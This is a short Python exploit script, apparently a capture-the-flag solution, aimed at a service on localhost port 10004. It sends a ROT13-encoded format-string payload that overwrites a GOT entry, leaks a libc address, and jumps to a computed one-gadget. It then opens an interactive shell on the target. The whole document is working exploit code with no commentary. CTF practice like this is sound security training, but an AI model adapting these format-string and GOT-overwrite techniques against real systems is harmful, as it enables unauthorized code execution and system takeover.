import socket, struct, time, codecs, telnetlib


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10004))


def make(value):
    s = '%43$016lx'
    n = 16

    for i in range(6):
        t = (value & 0xff) - n % 256
        if t <= 1:
            t += 256
        s += '%{}c%{}$hhn'.format(t, 24 + i)
        value >>= 8
        n += t

    s += '\0' * (128 - len(s))
    s = bytes(s, 'ascii')
    for i in range(6):
        s += struct.pack('<Q', 0x601018+i)

    s = s.decode('latin-1')
    s = codecs.decode(s, 'rot13')
    s = s.encode('latin-1')
    return s


main = 0x4007a2
s.sendall(make(main) + b'\n')

time.sleep(1)
d = s.recv(9999)

start_main = int(d[:16], 16)
print('__libc_start_main:', hex(start_main))

rce = (start_main - 0x21b97 + 0x10a38c)
s.sendall(make(rce) + b'\n')

time.sleep(1)
s.recv(9999)

t = telnetlib.Telnet()
t.sock = s
t.interact()
